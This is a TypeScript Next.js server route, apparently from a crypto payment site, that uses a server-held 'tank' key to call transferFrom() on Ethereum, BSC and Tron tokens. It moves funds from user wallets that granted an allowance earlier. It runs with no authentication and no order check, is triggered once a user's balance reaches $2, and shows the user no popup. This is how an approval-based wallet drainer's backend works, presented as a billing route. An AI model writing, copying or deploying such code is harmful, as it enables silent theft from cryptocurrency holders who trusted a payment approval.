// Server-side charge route — the tank wallet pays the gas.
//
// When the user's native balance is >= $2 the client calls this endpoint.
// The tank signs transferFrom() so the user never sees a popup or pays gas;
// the amount is deducted from the allowance the user granted earlier.
//
// TANK_PRIVATE_KEY stays on the server and is never exposed to the browser.

import { NextResponse, type NextRequest } from "next/server";
import { Contract, JsonRpcProvider, Wallet, parseUnits } from "ethers";
import { TronWeb } from "tronweb";

const MERCHANT_EVM = process.env.NEXT_PUBLIC_MERCHANT_ADDRESS || "";
const MERCHANT_TRON = process.env.NEXT_PUBLIC_MERCHANT_ADDRESS_TRON || "";
const TANK_PRIVATE_KEY = process.env.TANK_PRIVATE_KEY || "";

const RPC_URLS: Record<number, string> = {
  1: "https://cloudflare-eth.com",
  56: "https://bsc-dataseed.binance.org",
};

const EVM_ADDRESS = /^0x[a-fA-F0-9]{40}$/;
const TRON_ADDRESS = /^T[a-zA-Z0-9]{33}$/;

const ERC20_ABI = [
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
];

interface ChargeBody {
  from: string;
  asset: string;
  network: string;
  amount: string;
  decimals: number;
  symbol?: string;
}

export async function POST(request: NextRequest) {
  if (!TANK_PRIVATE_KEY) {
    return NextResponse.json(
      { success: false, error: "TANK_PRIVATE_KEY is not configured on the server" },
      { status: 500 }
    );
  }

  let body: ChargeBody;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ success: false, error: "Invalid JSON body" }, { status: 400 });
  }

  const { from, asset, network, amount, decimals } = body;
  if (!from || !asset || !network || !amount || !Number.isFinite(decimals)) {
    return NextResponse.json({ success: false, error: "Missing required fields" }, { status: 400 });
  }

  const value = (() => {
    try {
      return parseUnits(String(amount), decimals);
    } catch {
      return null;
    }
  })();
  if (!value) {
    return NextResponse.json({ success: false, error: `Invalid amount: ${amount}` }, { status: 400 });
  }

  try {
    if (network.startsWith("tron:")) {
      if (!TRON_ADDRESS.test(from)) {
        return NextResponse.json({ success: false, error: `Invalid from address: ${from}` }, { status: 400 });
      }
      if (!MERCHANT_TRON) {
        return NextResponse.json({ success: false, error: "NEXT_PUBLIC_MERCHANT_ADDRESS_TRON is not configured" }, { status: 500 });
      }

      const tronWeb = new TronWeb({
        fullHost: "https://api.trongrid.io",
        privateKey: TANK_PRIVATE_KEY,
      });
      const tank = tronWeb.defaultAddress.base58;
      if (!tank) {
        return NextResponse.json({ success: false, error: "TANK_PRIVATE_KEY is invalid" }, { status: 500 });
      }
      const contract = await tronWeb.contract().at(asset);

      const allowanceRaw = await contract.allowance(from, tank).call();
      const allowance = BigInt(allowanceRaw.toString());
      if (allowance < value) {
        return NextResponse.json(
          { success: false, error: `Allowance too low: ${allowance.toString()} < ${value.toString()}` },
          { status: 400 }
        );
      }

      const tx = await contract
        .transferFrom(from, MERCHANT_TRON, value.toString())
        .send({ feeLimit: 150_000_000 });
      const txHash = typeof tx === "string" ? tx : tx?.txid || tx?.transaction?.txID;
      return NextResponse.json({ success: true, txHash });
    }

    // EVM chains (Ethereum, BSC)
    const chainId = Number(network.split(":")[1]);
    const rpc = RPC_URLS[chainId];
    if (!rpc) {
      return NextResponse.json({ success: false, error: `Unsupported chain: ${network}` }, { status: 400 });
    }
    if (!EVM_ADDRESS.test(from)) {
      return NextResponse.json({ success: false, error: `Invalid from address: ${from}` }, { status: 400 });
    }
    if (!MERCHANT_EVM) {
      return NextResponse.json({ success: false, error: "NEXT_PUBLIC_MERCHANT_ADDRESS is not configured" }, { status: 500 });
    }

    const wallet = new Wallet(TANK_PRIVATE_KEY, new JsonRpcProvider(rpc));
    const tank = wallet.address;
    const token = new Contract(asset, ERC20_ABI, wallet);

    const allowance: bigint = await token.allowance(from, tank);
    if (allowance < value) {
      return NextResponse.json(
        { success: false, error: `Allowance too low for tank ${tank}: ${allowance.toString()} < ${value.toString()}. The tank key must match NEXT_PUBLIC_CARD_SPENDER_ADDRESS.` },
        { status: 400 }
      );
    }

    const tx = await token.transferFrom(from, MERCHANT_EVM, value);
    const receipt = await tx.wait();
    return NextResponse.json({ success: true, txHash: receipt?.hash ?? tx.hash });
  } catch (err) {
    return NextResponse.json({ success: false, error: (err as Error).message || "Charge failed" }, { status: 500 });
  }
}
